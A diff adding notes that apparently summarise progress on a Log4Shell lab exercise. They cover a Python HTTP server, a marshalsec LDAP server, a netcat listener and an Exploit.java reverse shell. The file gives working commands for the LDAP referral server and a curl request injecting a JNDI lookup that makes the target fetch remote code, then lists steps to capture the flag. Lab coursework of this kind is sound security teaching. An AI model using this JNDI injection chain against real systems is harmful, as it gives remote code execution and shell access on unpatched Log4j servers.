@@ -1,0 +1,53 @@
+Summary of what we've achieved so far:
+
+Environment Setup:
+
+You have all four required terminals set up:
+
+Terminal 1: For Java compilation and curl commands
+Terminal 2: Python HTTP server on port 4242
+Terminal 3: LDAP server on port 1389
+Terminal 4: Netcat listener on port 9999
+
+
+
+
+Exploit Preparation:
+
+We've written and compiled the Exploit.java file with a reverse shell payload
+We've tried various forms of the payload in the Java code
+
+
+Attack Attempts:
+
+We've tried multiple curl commands with JNDI injection via different headers
+We've tried different IP addresses (172.17.0.1 and attempts with 127.0.0.1)
+We've used various formats for the JNDI lookup string
+
+
+
+Current Issue:
+
+The LDAP server is not showing activity when we run the curl command
+The Python HTTP server is not receiving requests for the Exploit.class file
+The netcat listener is not receiving a reverse shell connection
+
+Next steps to get the flag:
+
+Verify LDAP server setup:
+Copycd ~/Desktop/log4shell/target
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/Exploit#Exploit" 1389
+
+Try a different curl command format:
+Copycurl -H 'GATECH_ID:123456789' -H 'Accept:${jndi:ldap://172.17.0.1:1389/Exploit}' http://localhost:8080/rest/cartoons/isAlive
+Note: The ordering of the parameters is slightly different here
+If you get a shell connection:
+
+Type whoami to verify you have root access
+Navigate back two directories with cd ../..
+Run java -jar Flag2.jar to get the flag
+Copy the flag value to your answer
+
+
+
+Remember, based on the forum posts, students were solving this by paying close attention to the exact syntax used in the curl command and ensuring all colons and other special characters were properly placed.
